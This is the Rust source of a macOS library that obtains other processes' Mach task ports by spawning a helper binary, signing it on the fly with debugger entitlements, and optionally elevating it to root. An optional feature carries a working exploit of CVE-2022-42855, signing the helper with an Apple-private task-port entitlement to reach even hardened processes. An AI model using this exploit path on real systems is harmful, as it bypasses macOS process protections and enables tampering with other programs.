//! # Portfetch
//! Portfetch serves to get a foreign process's Mach task port on Darwin systems. The `task_for_pid`
//! mach trap is subject to many restrictions on modern macOS, which portfetch helps navigate.
//!
//! When System Integrity Protection's Debugging Protection is disabled, only the same-or-0-euid
//! restriction is applied, but this is not the default configuration and toggling the option
//! involves a trip to recovery mode, which is not ideal.
//!
//! The following table illustrates the restrictions of the call in a full-SIP enviornment,
//! based on the caller and target's code signature:
//!
//! |                      | Bare | EUID 0 | Debugger Entitlement | Debugger + EUID 0 | Platform entitlement + EUID 0 |
//! |----------------------|------|--------|----------------------|-------------------|-------------------------------|
//! | Bare                 | FAIL | OK     | OK                   | OK                | OK                            |
//! | GT Allow Entitlement | OK   | OK     | OK                   | OK                | OK                            |
//! | Hardened Runtime     | FAIL | FAIL   | FAIL                 | FAIL              | OK                            |
//! | Runtime + GT Allow   | FAIL | FAIL   | OK                   | OK                | OK                            |
//!
//! When the target is running in a different EUID than the caller, the caller must have UID 0,
//! on top of the restrictions shown above.
//!
//! Portfetch launches a child process which is codesigned on-the-fly to have the needed entitlements
//! to call `task_for_pid`, and optionally elevates its privileges using native macOS escalation
//! dialogs. This means that when used the end-user has administrator access, a portfetch-using
//! process can get the task port of any process except those that are both hardened and without
//! `get-task-allow`.
//!
//! Portfetch can optionally help exploit CVE-2022-42855, which affects macOS versions 15 - 15.7.1.
//! The vulnerability allows non-apple code signatures, including ad-hoc signatures, to include
//! apple-private entitlements. Of interest are the `platform-binary` and
//! `com.apple.system-task-ports.control` entitlements, both of which only apply to UID 0 processes.
//! Both entitlements allow access to any task port on the system, including of hardened binaries,
//! even with full SIP. The `exploit-CVE-2022-42855` crate feature, enabling the
//! [get_port_admin_exploit] function which allows using the exploit to get the task port.

use std::collections::hash_map::DefaultHasher;
use std::ffi::{CString, OsStr};
use std::fs;
use std::fs::File;
use std::hash::Hasher;
use std::io::{ErrorKind, Read, Write};
use std::ops::Deref;
use std::os::fd::{AsRawFd, FromRawFd, OwnedFd};
use std::os::unix::ffi::OsStrExt;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::ptr::{null, null_mut};
use std::time::{SystemTime, UNIX_EPOCH};

use libc::{c_char, fileno, geteuid, pid_t};

use mach2::kern_return::{KERN_FAILURE, KERN_SUCCESS};
use mach2::port::mach_port_t;

use security_framework_sys::authorization::{
    errAuthorizationCanceled, errAuthorizationDenied, errAuthorizationSuccess,
    kAuthorizationFlagDefaults, AuthorizationCreate, AuthorizationExecuteWithPrivileges,
    AuthorizationRef,
};

use apple_codesign::{CodeSignatureFlags, MachFile, SettingsScope, SigningSettings, UnifiedSigner};
use sysinfo::{Pid, PidExt, ProcessExt, ProcessRefreshKind, RefreshKind, System, SystemExt};

use mach_util::mach_portal::MachPortal;
use mach_util::traps::pid_for_task;

use macos_portfetch_internal::STATUS_MESSAGES;

const PORTFETCH_BIN: &[u8] = include_bytes!(env!("CARGO_BIN_FILE_MACOS_PORTFETCH_INTERNAL"));

const ENT_XML_PORTFETCH: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.debugger</key>
    <true/>
</dict>
</plist>"#;

#[cfg(feature = "exploit-CVE-2022-42855")]
const ENT_XML_PORTFETCH_EXPL: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>AA_RCS_EXPL</key>
    <true/>
    <key>com.apple.application-identifier</key>
    <string>portfetch</string>
    <key>com.apple.system-task-ports.control</key>
    <true/>
</dict>
</plist>"#;

/// Gets a task port for a process using the `com.apple.security.cs.debugger` entitlement.
/// Target process needs to be signed with `get-task-allow`.
pub fn get_port_signed(target: pid_t) -> Result<mach_port_t, std::io::Error> {
    let bin = create_bin(PORTFETCH_BIN, Some(ENT_XML_PORTFETCH), true)?;

    // For some reason clippy thinks that the borrow is unnecessary... it isn't
    #[allow(clippy::needless_borrow)]
    let mut child = Command::new(&bin.0)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()?;

    let r = process_child(
        target,
        Some(child.id() as pid_t),
        child.stdin.take().unwrap(),
        child.stdout.take().unwrap(),
    );

    // Ensure process is really dead
    let _ = child.kill();

    r
}

/// Gets a task port for a process using the `com.apple.security.cs.debugger` entitlement and native
/// privilege elevation through Authorization Services
pub fn get_port_signed_admin(target: pid_t) -> Result<mach_port_t, std::io::Error> {
    let bin = create_bin(PORTFETCH_BIN, Some(ENT_XML_PORTFETCH), true)?;

    let (stdin, stdout) = priv_run(&bin.0, &[])?;

    process_child(target, None, stdin, stdout)
}

/// Gets a task port for a process using the `com.apple.system-task-ports` entitlement through CVE-2022-42855
/// and root uid, requesting elevation through Authorization Services
#[cfg(feature = "exploit-CVE-2022-42855")]
pub fn get_port_admin_exploit(target: pid_t) -> Result<mach_port_t, std::io::Error> {
    let bin = create_bin(PORTFETCH_BIN, Some(ENT_XML_PORTFETCH_EXPL), true)?;

    let (stdin, stdout) = priv_run(&bin.0, &[])?;

    process_child(target, None, stdin, stdout)
}

/// Given a running portfetch process's stdin and stdout, attemps to get a mach port for the target
fn process_child<I: Write, O: Read + AsRawFd>(
    target: pid_t,
    portfetch_id: Option<pid_t>,
    mut stdin: I,
    mut stdout: O,
) -> Result<mach_port_t, std::io::Error> {
    let bootstrap_name = {
        let mut h = DefaultHasher::new();
        h.write_i32(target);
        h.write_u32(std::process::id());
        h.write_u128(
            SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .map(|t| t.as_nanos())
                .unwrap_or(0),
        );
        format!("{:x}", h.finish())
    };
    let portal = MachPortal::register(&bootstrap_name)?;

    let mut input = vec![];
    input.extend_from_slice(target.to_string().as_bytes());
    input.push(b'\n');
    input.extend_from_slice(bootstrap_name.as_bytes());
    input.push(b'\n');
    stdin.write_all(&input)?;
    drop(stdin);

    macro_rules! check_state {
        ($stdout:ident, $stage:literal, $stage_name:literal) => {{
            let mut buf = [0u8; STATUS_MESSAGES[$stage].len()];
            match $stdout.read_exact(&mut buf) {
                Ok(()) => {}
                Err(e) => {
                    return Err(std::io::Error::new(
                        e.kind(),
                        format!(
                            "portfetch child pipe failed at stage {}: {}",
                            $stage_name, e
                        ),
                    ))
                }
            }
            if &buf != STATUS_MESSAGES[$stage] {
                let mut buf_full = buf.to_vec();
                if let Ok(mut r) = nonblock::NonBlockingReader::from_fd($stdout) {
                    let _ = r.read_available(&mut buf_full);
                }
                let err = String::from_utf8_lossy(&buf_full).to_string();
                return Err(std::io::Error::new(
                    ErrorKind::BrokenPipe,
                    format!("portfetch child failed {}: {}", $stage_name, err),
                ));
            }
        }};
    }

    check_state!(stdout, 0, "init");
    check_state!(stdout, 1, "connect");
    check_state!(stdout, 2, "get target port");

    let (port, origin_pid) = portal.receive_port()?;

    if let Some(check_pid) = portfetch_id {
        if check_pid != origin_pid {
            return Err(std::io::Error::new(
                ErrorKind::NotConnected,
                format!(
                    "got mach port message from pid {}, expected {}",
                    origin_pid, check_pid
                ),
            ));
        }
    }

    check_state!(stdout, 3, "send port");

    let mut pid: pid_t = 0;
    match unsafe { pid_for_task(port, &mut pid) } {
        KERN_SUCCESS => (),
        KERN_FAILURE => {
            return Err(std::io::Error::new(
                ErrorKind::InvalidData,
                format!("received invalid task port name {}", port),
            ))
        }
        other => {
            return Err(std::io::Error::new(
                ErrorKind::Other,
                format!("unexpected `pid_for_task` return code 0x{:x}", other),
            ))
        }
    }

    if pid != target {
        return Err(std::io::Error::new(
            ErrorKind::NotConnected,
            format!("received task port for unexpected pid {}", pid),
        ));
    }

    Ok(port)
}

/// Given an executable path and args to pass to it, launches it as root using Authorization Services
/// and returns the child's pid and pipe file for stdin/stdout
// From https://github.com/mitsuhiko/rust-runas/blob/master/runas-darwin.c
#[allow(non_upper_case_globals)] // This is from a foreign library anyways, not our problem
fn priv_run(exe: &Path, args: &[&str]) -> Result<(File, File), std::io::Error> {
    // Get c-string of path to exe
    let c_path = CString::new(exe.canonicalize()?.into_os_string().as_bytes())?;
    // Create c-string argument array and then array of pointers to those c-strings
    let mut c_args = args
        .iter()
        .cloned()
        .map(CString::new)
        .collect::<Result<Vec<CString>, _>>()?;
    let c_argv = {
        let mut r: Vec<*mut c_char> = c_args
            .iter_mut()
            .map(|a| a.as_ptr() as *mut c_char)
            .collect();
        r.push(null_mut());
        r
    };
    let pipe_fd = unsafe {
        // Create auth right
        let mut auth: AuthorizationRef = null_mut();
        match AuthorizationCreate(null(), null(), kAuthorizationFlagDefaults, &mut auth) {
            errAuthorizationSuccess => (),
            other => return Err(std::io::Error::from_raw_os_error(other)),
        };

        // Launch process after requesting perms
        let mut pipe: *mut libc::FILE = null_mut();
        match AuthorizationExecuteWithPrivileges(
            auth,
            c_path.as_ptr(),
            kAuthorizationFlagDefaults,
            c_argv.as_ptr(),
            &mut pipe,
        ) {
            errAuthorizationSuccess => (),
            errAuthorizationDenied | errAuthorizationCanceled => {
                return Err(std::io::Error::new(
                    ErrorKind::PermissionDenied,
                    "user denied authorization prompt",
                ))
            }
            other => return Err(std::io::Error::from_raw_os_error(other)),
        };

        OwnedFd::from_raw_fd(fileno(pipe))
    };
    let pipe_fd2 = pipe_fd.try_clone()?;
    Ok((File::from(pipe_fd), File::from(pipe_fd2)))
}

struct TempFile(PathBuf);
impl Drop for TempFile {
    // Can't really do anything if the file isn't deletable, so ignore errors
    #[allow(unused_must_use)]
    fn drop(&mut self) {
        fs::remove_file(&self.0);
    }
}

fn create_bin(bin: &[u8], ent: Option<&str>, hardened: bool) -> Result<TempFile, std::io::Error> {
    let mut out_bin = PathBuf::from("/tmp");

    let ext = {
        let mut ext_hasher = DefaultHasher::new();
        if let Some(e) = ent {
            ext_hasher.write(e.as_bytes());
        }
        ext_hasher.write_u8(hardened as u8);
        ext_hasher.write_u128(
            SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .map(|t| t.as_nanos())
                .unwrap_or(0),
        );
        format!("portfetch-{:x}", ext_hasher.finish())
    };

    out_bin.push(OsStr::new(ext.as_str()));

    fs::write(&out_bin, bin)?;
    // Either running as self or root, so lock perms down as much as possible
    fs::set_permissions(&out_bin, fs::Permissions::from_mode(0o700))?;

    if let Some(ent_xml) = ent {
        let mut sign = SigningSettings::default();
        sign.set_entitlements_xml(SettingsScope::Main, ent_xml)
            .map_err(|e| std::io::Error::new(ErrorKind::Other, e.to_string()))?;
        if hardened {
            sign.add_code_signature_flags(SettingsScope::Main, CodeSignatureFlags::RUNTIME);
        }
        UnifiedSigner::new(sign)
            .sign_macho(&out_bin, &out_bin)
            .map_err(|e| std::io::Error::new(ErrorKind::Other, e.to_string()))?;
    }

    Ok(TempFile(out_bin))
}

/// Represents a process's `task_for_pid` related security details: whether it is signed with the
/// hardened runtime, whether it is signed with the `get-task-allow` entitlement, and whether it has
/// the same euid as the probing process (will always be true if probing process is EUID 0)
pub struct ProbeInfo {
    pub hardened: bool,
    pub get_task_allow: bool,
    pub same_euid: bool,
}

impl ProbeInfo {
    /// Probes a PID and returns the relevant security details. This is not a cheap operation, and
    /// should not be called more than once per PID as the results cannot change in a process's lifetime.
    pub fn new(target: pid_t) -> Result<Self, Box<dyn std::error::Error>> {
        let system = System::new_with_specifics(
            RefreshKind::new().with_processes(ProcessRefreshKind::new().with_user()),
        );
        let process = system
            .process(Pid::from_u32(target as u32))
            .ok_or(std::io::Error::new(
                ErrorKind::NotFound,
                format!("pid {} does not exist", target),
            ))?;

        // No matching rust call?
        let cur_euid = unsafe { geteuid() };

        let same_euid = cur_euid == 0
            || &cur_euid
                == process
                    .effective_user_id()
                    .ok_or(std::io::Error::new(
                        ErrorKind::PermissionDenied,
                        "could not fetch target euid",
                    ))?
                    .deref();

        let exe_file = fs::read(process.exe())?;
        let exe = MachFile::parse(&exe_file)?;
        // TODO match correct arch instead of first
        let exe_data = exe.nth_macho(0)?;
        let cs = match exe_data.code_signature()? {
            None => {
                return Ok(Self {
                    same_euid,
                    get_task_allow: false,
                    hardened: false,
                })
            }
            Some(cs) => cs,
        };
        let get_task_allow = match cs.entitlements()? {
            None => false,
            // Could be tricked by get-task-allow=false, but who would do that
            Some(ent) => ent.as_str().contains("get-task-allow"),
        };

        let hardened = cs
            .code_directory()?
            .map(|blob| blob.flags & CodeSignatureFlags::RUNTIME == CodeSignatureFlags::RUNTIME)
            .unwrap_or(false);

        Ok(Self {
            same_euid,
            get_task_allow,
            hardened,
        })
    }
}
